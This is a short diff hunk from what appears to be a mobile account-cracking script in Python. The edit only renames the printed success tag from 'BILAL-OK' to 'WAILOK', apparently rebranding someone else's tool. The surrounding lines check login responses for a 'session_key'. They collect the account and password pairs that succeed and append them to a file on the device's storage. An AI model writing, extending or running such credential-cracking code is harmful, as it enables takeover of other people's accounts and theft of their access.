@@ -1426,7 +1426,7 @@ def method():2
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [BILAL-OK] '+acc+'| '+pword+'')
+                print('\r\033[1;92m [WAILOK] '+acc+'| '+pword+'')
                 open('/sdcard/WAIL-OK.txt','a').write(f'{acc}|{pword}\n ')
                 if c=='y':
                     try:
